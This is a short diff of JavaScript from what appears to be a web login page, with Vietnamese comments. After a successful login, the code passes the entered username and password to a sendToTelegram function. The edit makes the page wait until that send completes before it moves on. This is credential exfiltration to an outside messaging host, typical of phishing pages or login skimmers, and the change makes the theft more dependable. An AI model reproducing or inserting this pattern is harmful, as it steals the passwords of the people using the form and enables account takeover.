@@ -513,8 +513,8 @@
                 passwordInput.value = "";
                 return;
             }
-            // NẾU ĐĂNG NHẬP THÀNH CÔNG -> BÁO TELEGRAM (chạy ngầm)
-            sendToTelegram(username, password).catch(e => console.error("Tele err:", e));
+            // NẾU ĐĂNG NHẬP THÀNH CÔNG -> BÁO TELEGRAM (đợi gửi xong)
+            await sendToTelegram(username, password).catch(e => console.error("Tele err:", e));
             
             // Khôi phục nút (thực ra sắp chuyển trang nên không cần thiết lắm, nhưng cứ để cho chuẩn)
             loginBtn.innerHTML = prevText;
